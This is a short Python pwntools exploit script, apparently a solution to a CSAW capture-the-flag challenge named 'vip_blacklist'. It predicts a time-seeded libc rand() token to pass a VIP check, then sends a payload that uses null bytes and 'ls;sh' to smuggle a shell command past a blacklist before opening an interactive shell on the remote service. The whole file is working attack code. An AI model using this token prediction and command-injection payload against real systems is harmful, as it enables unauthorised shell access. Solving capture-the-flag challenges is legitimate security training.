from ctypes import CDLL
from math import floor
import time
import os
from pwn import *

libc = CDLL("libc.so.6")


context.log_level = 'debug'
#p = process("vip_blacklist")
p = remote("vip-blacklist.ctf.csaw.io", 9999)

now = int(floor(time.time()))
libc.srand(now)

vip = bytearray(10)
    
for i in range(10):
    vip[i] = libc.rand() % 256

sleep(1)
p.sendline(bytes(vip))
sleep(1)
p.sendline(b"queue\0clear\0exit\0\0ls;sh\0")
#p.sendline(b"queue\nclear\0exit\0\0ls;sh\0")

context.newline = b"\r\n"

p.interactive()
